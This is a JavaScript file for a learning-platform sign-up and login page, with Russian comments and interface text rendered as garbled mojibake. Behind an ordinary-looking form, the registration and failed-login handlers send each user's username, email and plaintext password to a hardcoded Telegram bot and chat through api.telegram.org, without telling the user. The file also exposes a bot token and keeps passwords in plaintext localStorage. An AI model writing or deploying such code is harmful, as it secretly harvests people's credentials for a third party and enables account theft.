// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –±–æ—Ç–∞ ‚Äî —Å—é–¥–∞ –≤—Å—Ç–∞–≤—å –°–í–û–ô —Ç–æ–∫–µ–Ω –∏ chat_id
const botToken = '8210164553:AAGl1d34muRXyeCoB_y-MFC1ESeHomBFsZA'; // ‚ö†Ô∏è –≤—Å—Ç–∞–≤—å —Ç–æ–∫–µ–Ω –±–æ—Ç–∞ —Å—é–¥–∞
const chatId = 8472334933;         // ‚ö†Ô∏è –≤—Å—Ç–∞–≤—å chat_id —Å—é–¥–∞

// –≠–ª–µ–º–µ–Ω—Ç—ã DOM
const form = document.getElementById('authForm');
const statusEl = document.getElementById('status');
const formTitle = document.getElementById('form-title');
const usernameInput = document.getElementById('username');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const confirmPasswordInput = document.getElementById('confirmPassword');
const submitButton = document.getElementById('submit-btn');
const switchText = document.getElementById('switch-text');
const switchLink = document.getElementById('switch-link');
const authContainer = document.getElementById('auth-container');
const learningPlatform = document.getElementById('learning-platform');

// –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ —Å–æ—Å—Ç–æ—è–Ω–∏—è
let isLoginMode = false;

// –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
const savedUserData = localStorage.getItem('userData');
const userData = savedUserData ? JSON.parse(savedUserData) : null;

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Ñ–æ—Ä–º—ã –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
document.addEventListener('DOMContentLoaded', function() {
    const savedTheme = localStorage.getItem('theme');
    if (savedTheme === 'dark') {
        document.body.classList.add('dark');
    }
    
    addThemeButton();
    initForm();
});

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Ñ–æ—Ä–º—ã
function initForm() {
    if (userData) {
        showLearningPlatform();
    } else {
        switchToRegister();
        authContainer.classList.remove('hidden');
        learningPlatform.classList.add('hidden');
    }
}

function switchToLogin() {
    isLoginMode = true;
    formTitle.textContent = '–í—Ö–æ–¥';
    submitButton.textContent = '–í–æ–π—Ç–∏';
    switchText.innerHTML = '–ù–µ—Ç –∞–∫–∫–∞—É–Ω—Ç–∞? <a href="#" id="switch-link">–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è</a>';
    confirmPasswordInput.classList.add('hidden');
    emailInput.classList.add('hidden');
}

function switchToRegister() {
    isLoginMode = false;
    formTitle.textContent = '–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è';
    submitButton.textContent = '–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è';
    switchText.innerHTML = '–£–∂–µ –µ—Å—Ç—å –∞–∫–∫–∞—É–Ω—Ç? <a href="#" id="switch-link">–í–æ–π—Ç–∏</a>';
    confirmPasswordInput.classList.remove('hidden');
    emailInput.classList.remove('hidden');
}

document.addEventListener('click', function(e) {
    if (e.target.id === 'switch-link') {
        e.preventDefault();
        if (isLoginMode) {
            switchToRegister();
        } else {
            switchToLogin();
        }
    }
});

form.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const username = usernameInput.value.trim();
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();
    const confirmPassword = confirmPasswordInput.value.trim();

    if (isLoginMode) {
        handleLogin(username, password);
    } else {
        handleRegister(username, email, password, confirmPassword);
    }
});

function handleRegister(username, email, password, confirmPassword) {
    if (!username || !email || !password || !confirmPassword) {
        showStatus('‚ö† –ó–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è!', 'error');
        return;
    }

    if (password !== confirmPassword) {
        showStatus('‚ùå –ü–∞—Ä–æ–ª–∏ –Ω–µ —Å–æ–≤–ø–∞–¥–∞—é—Ç!', 'error');
        return;
    }

    if (!validateEmail(email)) {
        showStatus('‚ùå –í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π email!', 'error');
        return;
    }

    const newUserData = {
        username: username,
        email: email,
        password: password,
        registeredAt: new Date().toISOString()
    };

    localStorage.setItem('userData', JSON.stringify(newUserData));
    
    const message = `‚úÖ –ù–æ–≤–∞—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è:\nüë§ Username: ${username}\nüìß Email: ${email}\nüîê Password: ${password}\n‚è∞ –í—Ä–µ–º—è: ${new Date().toLocaleString()}`;
    sendToTelegram(message);
    
    showStatus('‚úÖ –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞! –ó–∞–≥—Ä—É–∑–∫–∞ –ø–ª–∞—Ç—Ñ–æ—Ä–º—ã...', 'success');
    
    setTimeout(() => {
        showLearningPlatform();
        form.reset();
    }, 2000);
}

function handleLogin(username, password) {
    if (!userData) {
        showStatus('‚ùå –°–Ω–∞—á–∞–ª–∞ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å!', 'error');
        return;
    }

    if (!username || !password) {
        showStatus('‚ö† –ó–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è!', 'error');
        return;
    }

    if (username === userData.username && password === userData.password) {
        showStatus('‚úÖ –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥! –ó–∞–≥—Ä—É–∑–∫–∞ –ø–ª–∞—Ç—Ñ–æ—Ä–º—ã...', 'success');
        const message = `‚úÖ –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥:\nüë§ Username: ${username}\nüìß Email: ${userData.email}\n‚è∞ –í—Ä–µ–º—è: ${new Date().toLocaleString()}`;
        sendToTelegram(message);
        setTimeout(showLearningPlatform, 2000);
    } else {
        showStatus('‚ùå –ù–µ–≤–µ—Ä–Ω–æ–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ –ø–∞—Ä–æ–ª—å', 'error');
        const message = `‚ùå –ù–µ—É–¥–∞—á–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ –≤—Ö–æ–¥–∞:\nüë§ Username: ${username}\nüîê Password: ${password}\n‚è∞ –í—Ä–µ–º—è: ${new Date().toLocaleString()}`;
        sendToTelegram(message);
    }
}

function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}

// –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram
function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId, // ‚Üê –∏—Å–ø–æ–ª—å–∑—É–µ–º –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é, –∞ –Ω–µ —Ö–∞—Ä–¥–∫–æ–¥
            text: message
        })
    })
    .then(res => res.json())
    .then(data => {
        if (!data.ok) {
            console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', data.description);
        }
    })
    .catch(err => {
        console.error('–û—à–∏–±–∫–∞ —Å–µ—Ç–∏:', err);
    });
}

function showStatus(message, type = '') {
    statusEl.textContent = message;
    statusEl.style.color = type === 'error' ? 'var(--error)' : 'var(--success)';
}

function toggleTheme() {
    document.body.classList.toggle('dark');
    const isDark = document.body.classList.contains('dark');
    localStorage.setItem('theme', isDark ? 'dark' : 'light');
}

function showLearningPlatform() {
    authContainer.classList.add('hidden');
    learningPlatform.classList.remove('hidden');
    
    addLogoutButton();
    
    if (!window.learningPlatformInstance) {
        window.learningPlatformInstance = new LearningPlatform();
    }
    window.learningPlatformInstance.init();
}

function addLogoutButton() {
    const oldLogoutBtn = document.querySelector('.logout-btn');
    if (oldLogoutBtn) {
        oldLogoutBtn.remove();
    }
    
    const logoutBtn = document.createElement('button');
    logoutBtn.textContent = 'üö™ –í—ã–π—Ç–∏';
    logoutBtn.className = 'logout-btn';
    logoutBtn.onclick = function() {
        if (confirm('–¢–æ—á–Ω–æ –≤—ã–π—Ç–∏?')) {
            localStorage.removeItem('userData');
            window.location.reload();
        }
    };
    document.body.appendChild(logoutBtn);
}

function addThemeButton() {
    const existingThemeBtn = document.querySelector('.theme-switch');
    if (!existingThemeBtn) {
        const themeBtn = document.createElement('button');
        themeBtn.textContent = 'üåô –¢–µ–º–∞';
        themeBtn.className = 'theme-switch';
        themeBtn.onclick = toggleTheme;
        document.body.appendChild(themeBtn);
    }
}
